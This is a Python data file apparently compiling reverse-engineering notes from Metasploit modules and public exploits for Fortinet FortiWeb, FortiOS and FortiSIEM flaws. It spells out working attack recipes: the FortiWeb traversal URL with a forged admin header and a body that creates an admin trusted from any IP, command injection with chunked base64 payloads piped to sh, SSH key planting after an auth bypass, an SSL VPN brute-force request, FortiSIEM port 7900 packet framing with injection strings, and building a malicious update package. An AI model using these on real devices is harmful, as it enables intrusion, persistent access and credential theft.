"""
FortiWeb auth bypass + RCE + FortiSIEM command injection RE
Sources:
  - msf-modules/fortiweb_create_admin.rb (CVE-2025-64446)
  - msf-modules/fortiweb_rce.rb (CVE-2025-64446 + CVE-2025-58034)
  - msf-modules/fortios_auth_bypass_40684.rb (CVE-2022-40684 full MSF)
  - msf-modules/fortinet_ssl_vpn_brute.rb (SSL VPN login brute-force)
  - horizon3ai-pocs/CVE-2023-34992/CVE-2023-34992.py
  - horizon3ai-pocs/CVE-2024-23108/CVE-2024-23108.py
  - horizon3ai-pocs/CVE-2025-64155/CVE-2025-64155.py
  - cve-pocs/CVE-2021-44168/gen_src-vis_pkg_file.c
Products: FortiWeb, FortiOS, FortiSIEM, FortiGate
"""

# ---------------------------------------------------------
# CVE-2025-64446: FortiWeb authentication bypass via path traversal
# ---------------------------------------------------------
CVE_2025_64446 = {
    "cve":      "CVE-2025-64446",
    "product":  "Fortinet FortiWeb (web application firewall) -- management interface",
    "cvss":     "9.8 (Critical)",
    "class":    "Authentication bypass via path traversal in management API; unauthenticated admin account creation",
    "endpoint": "HTTPS /api/v2.0/cmdb/system/admin%3F/../../../../../cgi-bin/fwbcgi",
    "source":   "msf-modules/fortiweb_create_admin.rb + msf-modules/fortiweb_rce.rb",
    "versions": (
        "FortiWeb 7.0.0-7.0.11 (patched 7.0.12+), "
        "7.2.0-7.2.11 (patched 7.2.12+), "
        "7.4.0-7.4.9 (patched 7.4.10+), "
        "7.6.0-7.6.4 (patched 7.6.5+), "
        "8.0.0-8.0.1 (patched 8.0.2+); "
        "FortiWeb 6.x also affected (unsupported)."
    ),
}

CVE_2025_64446_MECHANICS = {
    "bypass_mechanism": (
        "POST to /api/v2.0/cmdb/system/admin%3F/../../../../../cgi-bin/fwbcgi. "
        "URL-encoded '?' (%3F) terminates the API path parsing. "
        "Directory traversal sequence '/../../../../../' escapes to root. "
        "Lands in /cgi-bin/fwbcgi -- the FortiWeb CGI handler. "
        "The path is accepted as authenticated because the '?' makes the API router "
        "treat this as a query string, bypassing auth middleware, "
        "while the CGI handler processes the traversal independently."
    ),

    "cgiinfo_header": (
        "CGIINFO header: Base64(JSON({'username': 'admin', 'profname': 'prof_admin', "
        "'vdom': 'root', 'loginname': 'admin'})). "
        "The CGI handler reads admin identity from this header -- no authentication. "
        "Attacker populates username/profname/vdom with desired values "
        "and the CGI processes the request as that admin."
    ),

    "vulnerability_detection": (
        "Check: POST to same path with empty data body. "
        "Vulnerable: response body JSON results.errcode == -56 (HTTP 200). "
        "Not vulnerable: HTTP 403 Forbidden (patched -- path traversal blocked). "
        "-56 is a FortiWeb error code indicating 'empty data' but auth passed."
    ),

    "admin_creation_body": {
        "q_type":            1,
        "name":              "<new_username>",
        "access-profile":    "prof_admin",
        "access-profile_val": "0",
        "trusthostv4":       "0.0.0.0/0",
        "trusthostv6":       "::/0",
        "type":              "local-user",
        "password":          "<new_password>",
        "note":              "Full admin with prof_admin profile; trust from any IP."
    },

    "re_insight": (
        "The CGIINFO header design reveals a FortiWeb architectural assumption: "
        "admin identity is passed from the web frontend to CGI scripts via an HTTP header. "
        "This design is safe only if the CGI handler is never directly reachable. "
        "The %3F path traversal breaks that assumption -- the CGI becomes directly reachable, "
        "and CGIINFO becomes attacker-controlled. "
        "This is the same class of vulnerability as FortiOS CVE-2022-40684 "
        "(Forwarded: for= bypasses the same frontend trust assumption)."
    ),
}


# ---------------------------------------------------------
# CVE-2025-58034: FortiWeb command injection via SAML user name (chained)
# ---------------------------------------------------------
CVE_2025_58034 = {
    "cve":      "CVE-2025-58034",
    "product":  "Fortinet FortiWeb -- CLI SAML user name field",
    "cvss":     "9.8 (Critical)",
    "class":    "OS command injection in SAML user config name; root RCE via CLI WebSocket",
    "endpoint": "wss://<target>/ws/cli/open (FortiWeb 7.x/8.x) or /httpclirqst (FortiWeb 6.x)",
    "source":   "msf-modules/fortiweb_rce.rb",
    "versions": "Same as CVE-2025-64446 plus FortiWeb 7.6.x patched in 7.6.6+, 7.4.x patched in 7.4.11+",
}

CVE_2025_58034_MECHANICS = {
    "injection_point": (
        "FortiWeb CLI command: 'config user saml-user; edit \"<name>\"; ...'. "
        "The name field is passed to a shell command. "
        "Injection: edit \"`<os-cmd>`\" -- backtick command substitution executes during 'edit'. "
        "The max name length is 63 characters. "
        "With two backticks: 61 characters for the OS command."
    ),

    "bad_chars": "` # ( ) > ' \"  -- all forbidden in the SAML user name field",

    "cli_access_v7_v8": (
        "WebSocket upgrade to /ws/cli/open. "
        "FortiWeb 7.x/8.x uses WebSocket for CLI console access. "
        "Non-standard: FortiWeb accepts only lowercase 'websocket' in Upgrade header. "
        "Standard clients send 'WebSocket' -- the MSF module downcase-patches the header. "
        "Authenticated: requires valid session cookie (APSCOOKIE_FWEB prefix)."
    ),

    "cli_access_v6": (
        "FortiWeb 6.x uses /httpclirqst HTTP endpoint for CLI access. "
        "POST act=connect to establish session; POST act=xmit to send commands; POST act=disconnect. "
        "Session ID returned as '{id}:Connected' in response body."
    ),

    "payload_delivery": (
        "The MSF module base64-encodes the payload and writes it in chunks via the CLI: "
        "'echo -n {chunk}|tee /tmp/{tmpfile}{idx}'. "
        "Chunk size: 63 - 2 (backticks) - len('echo -n |tee /tmp/{tmpfile}{n}') = ~38 chars. "
        "After all chunks: 'cat /tmp/{tmpfile}*|tee /tmp/{tmpfile}' assembles. "
        "Execution: 'cat /tmp/{tmpfile}|base64 -d|sh'. "
        "Python setsid() wrapper detaches from CLI session (nohup not available on 7.x): "
        "  python -c \"import subprocess;subprocess.Popen(...,start_new_session=True,...)\". "
        "FortiWeb 8.x has IMA (Linux Integrity Measurement Architecture) -- "
        "prevents executing downloaded ELF binaries; cmd/unix payloads work, fetch payloads do not."
    ),

    "version_detection": (
        "GET /api/v2.0/system/state returns CONFIG_MAJOR_NUM, CONFIG_MINOR_NUM, CONFIG_PATCH_NUM. "
        "API has a typo: 'resutls' instead of 'results' in some versions -- "
        "MSF module tries both keys. "
        "IMA enabled on 8.x -> cmd/unix/reverse_bash payload; "
        "IMA absent on 6.x/7.x -> cmd/linux/http/x64/meterpreter_reverse_tcp works."
    ),

    "re_insight": (
        "The SAML user name injection demonstrates a recurring Fortinet CLI pattern: "
        "configuration values that users can name (SAML configs, VDOMs, interface names, etc.) "
        "are passed to shell commands via sprintf/popen without sanitization. "
        "The 63-char limit is evidence of a buffer allocated for the name -- "
        "the limit was set by the struct field size, not by security intent. "
        "The MSF module's chunked base64 delivery through CLI is a clean primitive "
        "for injecting arbitrary payloads through a 61-char command constraint."
    ),
}


# ---------------------------------------------------------
# CVE-2022-40684 MSF full module: SSH key injection post-auth-bypass
# ---------------------------------------------------------
CVE_2022_40684_MSF_FULL = {
    "cve":      "CVE-2022-40684",
    "product":  "FortiOS, FortiProxy, FortiSwitchManager -- API auth bypass",
    "source":   "msf-modules/fortios_auth_bypass_40684.rb (full MSF module)",
    "note":     "Extends CVE-2022-40684 in fortinet_cve_poc_re.py (UserEnum.py); this adds SSH key injection.",
}

CVE_2022_40684_MSF_MECHANICS = {
    "bypass_headers": {
        "Forwarded": 'for="[127.0.0.1]:{rand_port}";by="[127.0.0.1]:{rand_port}"',
        "User-Agent": "Report Runner",
    },

    "exploit_chain": (
        "1. GET /api/v2/cmdb/system/admin -> unauthenticated (bypass); "
        "   collect all super_admin users with trusthost1=0.0.0.0/0. "
        "2. Prefer 'admin' user; fall back to random super_admin. "
        "3. GET /api/v2/cmdb/system/admin/{username} -> read existing ssh-public-key1/2/3 entries. "
        "4. Generate EC prime256v1 keypair (or load from file). "
        "5. PUT /api/v2/cmdb/system/admin/{username} with "
        "   ssh-public-key1..3 including attacker pubkey. "
        "   FortiOS returns 500 with 'SSH key is good' in cli_error on success. "
        "6. SSH connect to port 22 as {username} with attacker private key. "
        "7. cleanup(): PUT with '\"\"' to overwrite attacker key (best-effort cleanup)."
    ),

    "detection_primitive": (
        "check(): GET /api/v2/cmdb/{random_path} -> expect 401 (normal). "
        "Then GET /api/v2/cmdb/system/status with bypass headers -> "
        "200 + version JSON = vulnerable."
    ),

    "re_insight": (
        "FortiOS REST API accepts Forwarded: for=[127.0.0.1] as a loopback source indicator. "
        "The API auth middleware treats loopback IP as pre-authenticated. "
        "This is the same trust-the-header pattern as FortiWeb CGIINFO (CVE-2025-64446). "
        "Fortinet appears to have used header-based source trust as an internal auth shortcut "
        "across multiple products -- FortiOS (Forwarded:), FortiWeb (CGIINFO:), "
        "FortiOS mgmt (X-Admin-Passwd:). "
        "The SSH key injection demonstrates that auth bypass alone is pivotable to persistent access: "
        "even after the bypass is patched, SSH keys added during the window survive."
    ),
}


# ---------------------------------------------------------
# FortiOS SSL VPN brute-force primitive
# ---------------------------------------------------------
FORTINET_SSLVPN_BRUTE = {
    "id":       "FVPN-BRUTE",
    "product":  "FortiOS SSL VPN (/remote/logincheck)",
    "class":    "Credential brute-force; no lockout enforcement observed",
    "source":   "msf-modules/fortinet_ssl_vpn_brute.rb",

    "fingerprint": "GET /remote/login?lang=en -> body contains 'fortinet'",

    "login_request": {
        "method":   "POST",
        "endpoint": "/remote/logincheck",
        "content-type": "application/x-www-form-urlencoded",
        "params": {
            "ajax":       "1",
            "username":   "<user>",
            "credential": "<pass>",
            "realm":      "<domain or empty>",
        },
    },

    "success_indicator": "HTTP 200 + body contains 'redir=' AND '&portal='",

    "re_insight": (
        "The FortiOS SSL VPN login endpoint does not appear to implement "
        "aggressive rate-limiting or lockout in default configuration. "
        "The 'ajax=1' parameter enables the JSON/form response path vs. HTML redirect. "
        "The 'realm' parameter selects the authentication domain -- "
        "brute-force across multiple realms multiplies the attack surface. "
        "The 87k+ config dump referenced in Fortinet-Hunter-2026 is the credential corpus "
        "for this endpoint: CVE-2018-13379 disclosed plaintext VPN session files "
        "which became the input for mass SSL VPN brute-force campaigns."
    ),
}


# ---------------------------------------------------------
# CVE-2023-34992: FortiSIEM RCE via NFS server_ip injection (original)
# ---------------------------------------------------------
CVE_2023_34992 = {
    "cve":      "CVE-2023-34992",
    "product":  "Fortinet FortiSIEM -- Phoenix Monitor service port 7900",
    "cvss":     "10.0 (Critical) -- CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
    "class":    "OS command injection in server_ip field of TEST_STORAGE NFS XML request; unauthenticated",
    "endpoint": "TLS TCP/7900 (Phoenix Monitor service)",
    "source":   "horizon3ai-pocs/CVE-2023-34992/CVE-2023-34992.py",
}

CVE_2023_34992_MECHANICS = {
    "protocol": {
        "transport": "TLS over TCP port 7900",
        "framing":   "16-byte LE header + XML body",
        "header":    "struct.pack('<IIII', 81, len(payload), 1075724911, 0)",
        "fields": {
            "field_1": "81 = command code (handleStorageRequest)",
            "field_2": "len(payload) = XML body length",
            "field_3": "1075724911 = 0x40240077 (magic / protocol version)",
            "field_4": "0 = always zero",
        },
    },

    "injection_field": (
        "XML body: "
        "<TEST_STORAGE type='nfs'> "
        "<server_ip>127.0.0.1; {command};</server_ip> "
        "<mount_point>/test</mount_point> "
        "</TEST_STORAGE>. "
        "The server_ip value is passed to a shell command (likely mount NFS). "
        "Semicolons allow command chaining: '127.0.0.1; id;' executes 'id' as root."
    ),

    "no_auth": "Port 7900 Phoenix Monitor service has no authentication at the protocol level.",
}


# ---------------------------------------------------------
# CVE-2024-23108: FortiSIEM patch bypass -- mount_point injection
# ---------------------------------------------------------
CVE_2024_23108 = {
    "cve":      "CVE-2024-23108",
    "product":  "Fortinet FortiSIEM -- Phoenix Monitor service port 7900",
    "cvss":     "10.0 (Critical)",
    "class":    "CVE-2023-34992 patch bypass -- injection moved to mount_point field",
    "endpoint": "TLS TCP/7900",
    "source":   "horizon3ai-pocs/CVE-2024-23108/CVE-2024-23108.py",
}

CVE_2024_23108_MECHANICS = {
    "patch_bypass": (
        "Fortinet patched CVE-2023-34992 by sanitizing the server_ip field. "
        "CVE-2024-23108 exploits the same injection via the mount_point field instead: "
        "<TEST_STORAGE type='nfs'> "
        "<server_ip>127.0.0.1</server_ip> "
        "<mount_point>/lala; {command};</mount_point> "
        "</TEST_STORAGE>. "
        "Same protocol header (field_1=81, magic=1075724911). "
        "mount_point is also passed to the NFS mount shell command without sanitization. "
        "Demonstrates incomplete patch: only one injection field was sanitized, "
        "not the entire command-building function."
    ),

    "re_insight": (
        "CVE-2023-34992 -> CVE-2024-23108 is a textbook 'incomplete patch' vulnerability. "
        "Fortinet sanitized the parameter that was named in the CVE but not "
        "the underlying construction of the shell command. "
        "Ablation sweep target: find the NFS test/mount function in the FortiSIEM "
        "phoenixd binary; enumerate all string parameters passed to system() / popen(). "
        "Each one is a potential injection vector -- a complete fix requires "
        "parameterized command construction or allowlist on all inputs."
    ),
}


# ---------------------------------------------------------
# CVE-2025-64155: FortiSIEM curl argument injection via Elasticsearch cluster_url
# ---------------------------------------------------------
CVE_2025_64155 = {
    "cve":      "CVE-2025-64155",
    "product":  "Fortinet FortiSIEM -- Phoenix Monitor service port 7900",
    "cvss":     "10.0 (Critical)",
    "class":    "curl argument injection in cluster_url field of TEST_STORAGE elastic XML; file write to disk",
    "endpoint": "TLS TCP/7900",
    "source":   "horizon3ai-pocs/CVE-2025-64155/CVE-2025-64155.py",
}

CVE_2025_64155_MECHANICS = {
    "different_storage_type": (
        "Prior CVEs (34992, 23108): type='nfs'; injection via semicolon in shell args. "
        "CVE-2025-64155: type='elastic' (Elasticsearch storage). "
        "Command code: 156 (different handleStorageRequest sub-handler). "
        "Magic constant: 1075724911 (same)."
    ),

    "injection": (
        "XML body: "
        "<TEST_STORAGE type='elastic'> "
        "<cluster_url>http://10.0.40.83:9200 --next -o /opt/charting/redishb.sh http://10.0.40.83:9200</cluster_url> "
        "</TEST_STORAGE>. "
        "The cluster_url is passed directly to a curl command: "
        "/opt/phoenix/phscripts/bin/elastic_test_url.sh 'test_name' '{cluster_url}'. "
        "curl interprets '--next -o /path' as option flags: "
        "  --next: separate subsequent request options, "
        "  -o /opt/charting/redishb.sh: write attacker-controlled HTTP response to disk. "
        "The attacker hosts a shell script at the URL; curl writes it to /opt/charting/redishb.sh. "
        "Result: arbitrary file write to any path curl can write to."
    ),

    "re_insight": (
        "This is a different injection class than 34992/23108: not semicolon shell injection "
        "but curl argument injection. The distinction matters for patching: "
        "shell metachar sanitization would not block this vector. "
        "The three FortiSIEM CVEs (34992, 23108, 64155) are a progression: "
        "  server_ip shell injection -> mount_point shell injection -> cluster_url curl injection. "
        "Each uses the same port/protocol but different XML fields and different injection classes. "
        "The attackable surface is the entire TEST_STORAGE XML handler set -- "
        "every storage type (NFS, Elasticsearch, S3, SMB?) is a potential injection vector. "
        "Ablation: identify all storage-type handlers in phoenixd; "
        "trace each URL/path field to the system call."
    ),
}


# ---------------------------------------------------------
# CVE-2021-44168: FortiOS FortiGuard update package directory traversal
# ---------------------------------------------------------
CVE_2021_44168 = {
    "cve":      "CVE-2021-44168",
    "product":  "Fortinet FortiOS -- FortiGuard update package handler (/bin/init)",
    "cvss":     "7.8 (High)",
    "class":    "Zip/tar directory traversal in FortiGuard update package; arbitrary file write via srcvis package",
    "endpoint": "FortiGuard FDS update download (network-delivered package via FGFM/FDS protocol)",
    "source":   "cve-pocs/CVE-2021-44168/gen_src-vis_pkg_file.c",
}

CVE_2021_44168_MECHANICS = {
    "package_format": {
        "pkg_header_size": "0x40 bytes (64 bytes)",
        "pkg_header_fields": {
            "offset_0x0":  "pad (4 bytes)",
            "offset_0x4":  "version string (8 bytes) -- e.g. '06000004' = 6.0.4",
            "offset_0xC":  "num_objects (4 bytes)",
            "offset_0x10": "size1 = compressed_size + obj_header_size",
            "offset_0x14": "header_len = 0x40",
            "offset_0x3C": "crc32 of header XOR'd with salt 'B1gS'",
        },
        "obj_header_size": "128 bytes (0x80)",
        "obj_header_fields": {
            "offset_0x0":  "pkg_type (4 bytes) -- e.g. 'CIDB', 'AVDB', 'NIDS'",
            "offset_0x2C": "flags (4 bytes) -- FLAG_SKIP_DATA_CRC32=1",
            "offset_0x30": "data_len (4 bytes) = zlib-compressed payload size",
            "offset_0x34": "header_len (4 bytes) = 0x80",
            "offset_0x78": "data_crc32 (4 bytes) = CRC32 of uncompressed tar",
            "offset_0x7C": "header_crc32 (4 bytes) = CRC32 of header XOR'd with salt 'H1dN'",
        },
        "payload_compression": "Raw zlib deflate (deflateInit_ with zlib version '1.2.11', window 0x70)",
    },

    "directory_traversal": (
        "The package contains a tarball. "
        "FortiOS extracts the tarball via a function that does NOT strip leading path components. "
        "Vulnerability: a tar entry with path '././../../../../etc/cron.d/evil' is extracted "
        "relative to the extraction directory. "
        "The single './' prefix is critical -- it triggers the traversal in FortiOS's tar extractor. "
        "Build malicious tarball: 'tar Pcf file.tar ./../../../../path/to/target_file'. "
        "Package type must be 'CIDB' (Client ID Object) -- FortiOS processes this type. "
        "Version string must match the target: '06000004' for 6.0.4 targets."
    ),

    "known_object_types": (
        "FCPC=Command, AVDB=Virus Defs, NIDS=Attack Defs, PRXY=Proxy Exec, "
        "AVEN=AV Engine, FIMG=Firmware Image, HASY=HA Sync, FSLP=SSLVPN Package, "
        "CIDB=Client ID Object (vulnerable), APDB=App DB, ISDB=Industrial DB, ..."
    ),

    "re_insight": (
        "The srcvis package format is FortiGuard's internal update package protocol. "
        "Salts 'B1gS' (pkg header) and 'H1dN' (obj header) are hardcoded constants "
        "used to differentiate the CRC32 from a plain checksum. "
        "They are security-by-obscurity: once the format is reverse-engineered, "
        "a valid package can be constructed for any payload. "
        "The version string check (bf_validate_pkg_firmware_version at 01564090 in 7.0.2 VM) "
        "confirms FortiOS does check version compatibility -- but an older version string "
        "can be used against newer devices if the check is non-strict. "
        "Note: this requires MITM or access to the FortiGuard update channel."
    ),
}


# ---------------------------------------------------------
# FortiSIEM protocol systemic analysis
# ---------------------------------------------------------
FORTISIEM_PORT_7900_SYSTEMIC = {
    "id":       "FSIEM-PORT7900-SYSTEMIC",
    "product":  "Fortinet FortiSIEM -- Phoenix Monitor service",
    "severity": "CRITICAL -- three distinct RCE vectors on the same unauthenticated port",

    "pattern": (
        "Port 7900 (Phoenix Monitor service) is an unauthenticated binary protocol. "
        "Three CVEs from two researchers demonstrate three independent injection paths: "
        "  CVE-2023-34992: server_ip shell injection (type=nfs, code=81). "
        "  CVE-2024-23108: mount_point shell injection (type=nfs, code=81) -- patch bypass. "
        "  CVE-2025-64155: cluster_url curl arg injection (type=elastic, code=156). "
        "The 16-byte protocol header is trivially constructable: "
        "  struct.pack('<IIII', command_code, len(payload), 1075724911, 0). "
        "Authentication: none at the protocol layer. "
        "Each storage type handler is a separate attack surface -- "
        "S3, SMB, SFTP, Azure Blob handlers likely contain similar injection points. "
        "Ablation semantic sweep target: all storage type handlers in phoenixd; "
        "query for functions calling system()/popen() with string-built commands. "
        "CVE-2025-25256 (watchTowr) is the same bug family but via archive_nfs_archive_dir -- "
        "a fourth NFS-adjacent injection point on the same port."
    ),

    "hardcoded_magic": "0x40240077 = 1075724911 -- confirmed across all three CVEs and watchTowr CVE-2025-25256",
}
